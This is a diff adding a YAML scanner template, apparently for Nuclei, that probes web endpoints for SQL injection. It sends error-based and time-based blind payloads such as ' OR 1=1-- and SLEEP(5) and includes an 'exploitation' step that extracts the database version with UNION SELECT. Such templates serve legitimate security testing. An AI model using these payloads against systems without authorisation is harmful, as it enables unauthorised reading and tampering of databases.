@@ -1,0 +1,59 @@
+id: sqli-god
+name: SQL Injection – God Level (Error‑Based + Time‑Based)
+severity: critical
+impact: Attacker can read, modify, or delete database contents.
+chain: Use UNION to extract data.
+
+requests:
+  # 1. Error-based SQLi
+  - method: GET
+    path:
+      - "{{BaseURL}}/products?category=1' OR 1=1--"
+      - "{{BaseURL}}/search?q=test' AND 1=1--"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - "SQLSTATE"
+          - "MySQL"
+          - "PostgreSQL"
+          - "ORA-"
+          - "Microsoft OLE DB"
+          - "Unclosed quotation mark"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<html"
+          - "OpsTools"
+
+  # 2. Time-based blind SQLi (check response time > 5s)
+  - method: GET
+    path:
+      - "{{BaseURL}}/products?category=1' AND (SELECT SLEEP(5))--"
+      - "{{BaseURL}}/search?q=test' AND pg_sleep(5)--"
+    matchers:
+      - type: status
+        status: 200
+      - type: time
+        min: 5
+        max: 10
+
+verification:
+  # Re‑send the time‑based payload and confirm delay
+  - method: GET
+    path: "{{BaseURL}}/products?category=1' AND (SELECT SLEEP(3))--"
+    matchers:
+      - type: time
+        min: 3
+        max: 6
+
+exploitation:
+  # Extract database version using UNION (if error‑based)
+  - method: GET
+    path: "{{BaseURL}}/products?category=1' UNION SELECT @@version--"
+    extract:
+      type: regex
+      pattern: '\d+\.\d+\.\d+'
